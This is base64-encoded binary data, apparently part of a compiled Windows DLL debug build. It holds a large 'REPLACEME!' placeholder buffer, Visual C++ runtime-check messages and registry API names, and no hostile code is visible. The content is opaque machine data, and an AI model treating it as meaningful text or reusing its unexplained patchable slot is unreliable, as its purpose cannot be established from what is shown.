FSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIVJFUExBQ0VNRSFSRVBMQUNFTUUhUkVQTEFDRU1FIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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